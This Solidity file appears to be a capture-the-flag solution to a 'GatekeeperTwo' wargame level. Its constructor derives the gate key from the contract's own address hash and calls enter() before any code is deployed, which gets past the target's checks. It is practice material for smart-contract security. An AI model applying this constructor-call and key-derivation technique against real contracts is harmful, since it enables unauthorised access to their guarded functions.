// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level14.sol";

contract let_me_in_two
{
    GatekeeperTwo level14;
    constructor(address _level14)
    {
        level14 = GatekeeperTwo(_level14);
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ type(uint64).max); 
        level14.enter(_gateKey);
    }
}